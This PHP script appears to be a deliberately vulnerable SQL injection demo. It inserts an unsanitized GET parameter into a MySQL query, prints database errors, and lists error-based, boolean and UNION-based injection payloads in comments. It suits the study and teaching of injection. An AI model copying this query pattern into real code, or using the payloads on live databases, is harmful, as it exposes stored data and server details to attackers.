<?php
// import credentials
include('../mysql_credentials.php');

// Open SQL Server connection
$con = new mysqli( $mysql_server, $mysql_user, $mysql_pass, $mysql_db );

// Check for SQL error
if ($con->connect_error) die ("Connection failed: " .$con->connect_error);

$max = $_GET['max'];

$query = "SELECT * FROM items WHERE price <= $max";
// $max = 1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -
// SELECT * FROM items WHERE price <= 1 OR 1 LIMIT 0,1 -- - 
// SELECT * FROM items WHERE price <= 1 UNION ALL SELECT VERSION() AS name, VERSION() AS price -- -
// SELECT * FROM items WHERE price <= 1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -


$result = $con->query($query);
echo $con->error;

while( $row = $result->fetch_assoc() ) {
  $price = $row["price"];
  echo " - $price.00 € <br/>";
}

$con->close();
